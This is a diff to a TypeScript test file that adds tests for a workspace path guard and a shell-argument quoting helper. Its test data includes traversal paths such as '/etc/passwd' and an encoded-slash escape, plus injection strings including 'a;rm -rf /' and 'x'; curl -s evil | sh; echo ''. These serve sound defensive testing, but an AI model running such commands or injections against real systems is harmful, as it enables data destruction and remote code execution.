@@ -29,12 +29,15 @@ import {
   MAX_ID_LENGTH,
   MAX_KEY_BYTES,
   MAX_MANIFEST_ENTRIES,
+  MAX_PATH_BYTES,
   SNAPSHOT_LIMIT_BYTES,
   assertKeyFits,
   assertSafeSessionId,
   formatLimit,
   isOverSnapshotLimit,
   manifestKey,
+  quoteShellArg,
+  safeWorkspacePath,
   tarKey,
   workspacePrefix,
 } from "../src/workspace-keys.ts";
@@ -215,6 +218,83 @@ check("the mirror formats a size exactly as this tree does", () => {
   for (const n of [SNAPSHOT_LIMIT_BYTES, Math.round(41.2 * 1024 * 1024), 242 * 1024, 900, 0]) {
     assert.equal(mirror.formatLimit(n), formatLimit(n), `formatLimit(${n}) differs`);
   }
+});
+
+// ------------------------------------------------------------ path guard ----
+//
+// Task 30. The delete route decodes its tail once, here, and hands the result to
+// rm inside the session's own microVM. These are the shapes that must never reach
+// a command, including the ones the URL layer cannot see because its slashes were
+// still encoded when it normalized the path.
+
+check("the path guard accepts the names a real workspace uses", () => {
+  const ok = [
+    "a.txt",
+    "src/app.ts",
+    "my report.txt",
+    "we're here.md",
+    "a/b/c-d.tar.gz",
+    ".bashrc",
+    "100%",
+    "note,with,commas",
+  ];
+  for (const path of ok) {
+    assert.equal(safeWorkspacePath(path), path, `refused a legal name: ${path}`);
+  }
+});
+
+check("the path guard refuses every escape shape", () => {
+  const bad = [
+    "",
+    "/etc/passwd",
+    "../outside",
+    "a/../b",
+    "a/../../b",
+    "a/..",
+    "./a",
+    "a/./b",
+    "a//b",
+    "a/",
+  ];
+  for (const path of bad) {
+    assert.equal(safeWorkspacePath(path), null, `accepted an escape: ${JSON.stringify(path)}`);
+  }
+});
+
+check("the encoded-slash tail that survives URL normalization is refused here", () => {
+  // Exactly what the delete route builds from
+  // /api/sessions/abc/workspace/files/x%2f..%2f..%2fetc%2fpasswd after one
+  // decodeURIComponent. The URL layer never saw a slash, so it never normalized
+  // the dots. If this ever returns non-null, a delete has a traversal.
+  const decoded = decodeURIComponent("x%2f..%2f..%2fetc%2fpasswd");
+  assert.equal(decoded, "x/../../etc/passwd");
+  assert.equal(safeWorkspacePath(decoded), null, "dot-dot through an encoded slash got through");
+});
+
+check("the path guard refuses control characters and an over-long name", () => {
+  assert.equal(safeWorkspacePath("a\nb.txt"), null, "a newline prints as two rows");
+  assert.equal(safeWorkspacePath("a\tb.txt"), null, "tab is refused with the rest");
+  assert.equal(safeWorkspacePath("a\u0000b"), null, "a NUL is never a filename");
+  assert.equal(safeWorkspacePath("x".repeat(MAX_PATH_BYTES)), "x".repeat(MAX_PATH_BYTES));
+  assert.equal(safeWorkspacePath("x".repeat(MAX_PATH_BYTES + 1)), null, "the ceiling moved");
+  assert.equal(
+    safeWorkspacePath("é".repeat(MAX_PATH_BYTES)),
+    null,
+    "the ceiling counts bytes, not code units"
+  );
+});
+
+check("shell quoting leaves no metacharacter live", () => {
+  assert.equal(quoteShellArg("a.txt"), "'a.txt'");
+  assert.equal(quoteShellArg("it's"), "'it'\\''s'");
+  assert.equal(quoteShellArg("a;rm -rf /"), "'a;rm -rf /'");
+  assert.equal(quoteShellArg("$(whoami)`id`"), "'$(whoami)`id`'");
+  assert.equal(quoteShellArg("a|b&c"), "'a|b&c'");
+  const hostile = "x'; curl -s evil | sh; echo '";
+  const quoted = quoteShellArg(hostile);
+  assert.equal(quoted, "'x'\\''; curl -s evil | sh; echo '\\'''");
+  // Every quote in the result is accounted for: an odd count would mean an escape.
+  assert.equal((quoted.match(/'/g) ?? []).length % 2, 0, "unbalanced quoting");
 });
 
 // ---------------------------------------------------------------- purity ----
